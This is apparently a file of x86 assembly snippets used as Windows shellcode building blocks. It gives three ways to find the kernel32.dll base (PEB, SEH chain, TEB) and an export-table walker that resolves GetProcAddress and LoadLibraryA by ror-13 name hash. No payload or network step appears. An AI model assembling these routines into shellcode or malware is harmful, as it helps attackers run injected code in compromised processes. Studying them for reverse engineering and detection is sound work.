
; using PEB - Process Execution Block
find_kernel32:
push esi
xor eax, eax
mov eax, fs:[eax+0x30]
test eax, eax
js find_kernel32_9x
find_kernel32_nt:
mov eax, [eax + 0x0c]
mov esi, [eax + 0x1c]
lodsd
mov eax, [eax + 0x8]
jmp find_kernel32_finished
find_kernel32_9x:
mov eax, [eax + 0x34]
lea eax, [eax + 0x7c]
mov eax, [eax + 0x3c]
find_kernel32_finished:
pop esi
ret

; using SEH - Structured Exception Handling
find_kernel32:
push esi
push ecx
xor ecx, ecx
mov esi, fs:[ecx]
not ecx
find_kernel32_seh_loop:
lodsd
mov esi, eax
cmp [eax], ecx
jne find_kernel32_seh_loop
find_kernel32_seh_loop_done:
mov eax, [eax + 0x04]
find_kernel32_base:
find_kernel32_base_loop:
dec eax
xor ax, ax
cmp word ptr [eax], 0x5a4d
jne find_kernel32_base_loop
find_kernel32_base_finished:
pop ecx
pop esi
ret


; Using TEB - Thread Environment Block
; Only works with Windows NT
find_kernel32:
push esi
xor esi, esi
mov esi, fs:[esi + 0x18]
lodsd
lodsd
mov eax, [eax - 0x1c]
find_kernel32_base:
find_kernel32_base_loop:
dec eax
xor ax, ax
cmp word ptr [eax], 0x5a4d
jne find_kernel32_base_loop
find_kernel32_base_finished:
pop esi
ret


; Now we need to get the address of GetProcAddress and LoadLibraryA function
find_function:
pushad
mov ebp, [esp + 0x24]
mov eax, [ebp + 0x3c]
mov edx, [ebp + eax + 0x78]
add edx, ebp
mov ecx, [edx + 0x18]
mov ebx, [edx + 0x20]
add ebx, ebp
find_function_loop:
jecxz find_function_finished
dec ecx
mov esi, [ebx + ecx * 4]
add esi, ebp
compute_hash:
xor edi, edi
xor eax, eax
cld
compute_hash_again:
lodsb
test al, al
jz compute_hash_finished
ror edi, 0xd
add edi, eax
jmp compute_hash_again
compute_hash_finished:
find_function_compare:
cmp edi, [esp + 0x28]
jnz find_function_loop
mov ebx, [edx + 0x24]
add ebx, ebp
mov cx, [ebx + 2 * ecx]
mov ebx, [edx + 0x1c]
add ebx, ebp
mov eax, [ebx + 4 * ecx]
add eax, ebp
mov [esp + 0x1c], eax
find_function_finished:
popad
ret
